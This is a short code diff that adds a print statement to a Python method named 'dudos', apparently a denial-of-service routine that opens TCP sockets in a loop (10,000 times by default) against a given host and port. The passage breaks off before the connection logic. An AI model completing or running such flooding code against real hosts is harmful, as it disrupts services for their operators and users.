@@ -38,6 +38,7 @@ class Toast(BaseResponder):
 
 	def dudos(self, host='127.0.0.1', port=8080, times=10000, sock=None):
 		self.respond(sock, 'Dudos in progress...')
+		print('Dudos in progress...')
 		for _ in range(times):
 			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			try:
